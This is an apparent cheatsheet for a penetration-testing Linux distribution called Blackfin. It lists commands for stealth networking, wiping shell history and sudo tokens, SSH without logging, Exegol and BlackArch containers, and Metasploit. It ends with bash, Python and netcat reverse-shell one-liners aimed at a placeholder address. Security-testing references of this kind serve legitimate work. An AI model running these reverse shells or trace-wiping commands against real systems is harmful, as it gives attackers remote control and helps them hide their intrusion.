# 🦈 Blackfin Cheatsheet

Welcome to Blackfin. Here are the essential commands to control your arsenal.

## 🧠 Sensei (AI Mentor)
| Command | Description |
| :--- | :--- |
| `just ask "question"` | Ask your AI Mentor about hacking, tools, or Linux. |
| `just cheat` | Show this cheatsheet. |

## 🥷 Stealth & Privacy (Blackfin Exclusive)
| Command | Description |
| :--- | :--- |
| `just stealth-mode-on` | Randomize MAC address, block Bluetooth, enable strict firewall. |
| `just stealth-mode-off` | Restore default network settings. |
| `just ghost-shell` | Launch a shell with a spoofed IP (Ghost IP) for scanning. |
| `just clean-traces` | Wipe Bash history, Sudo tokens, and temporary files. |
| `just ssh-stealth user@ip` | Connect via SSH without logging to `known_hosts` or history. |

## 📦 Package & Resources
| Command | Description |
| :--- | :--- |
| `just blackfin-update` | Update System (Atomic), Flatpaks, Exegol images, and BlackArch. |
| `just install-seclists`| Download SecLists (Big Wordlists) to `~/Wordlists`. |
| `rpm-ostree install <pkg>` | Install a persistent system package (Requires Reboot). |
| `brew install <tool>` | Install a CLI tool via Homebrew (Recommended). |

## ⚔️ Exegol (Dockerized Pentest)
| Command | Description |
| :--- | :--- |
| `exegol start` | Start your default container. |
| `exegol shell` | Enter the running container. |
| `exegol install` | Install or update an image. |
| `exegol info` | Check configuration and Docker/Podman status. |

## 🏴‍☠️ BlackArch (Distrobox)
| Command | Description |
| :--- | :--- |
| `start-blackarch` | Enter the BlackArch container. |
| `distrobox upgrade blackarch` | Update tools inside BlackArch. |
| `msfconsole` | Run Metasploit (available directly from host if exported). |

## 🔥 Reverse Shell One-Liners
**Bash:**
```bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
```

**Python:**
```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

**Netcat:**
```bash
nc -e /bin/sh 10.10.10.10 4444
```

---
*Documentation location: /usr/share/doc/blackfin/CHEATSHEET.md*
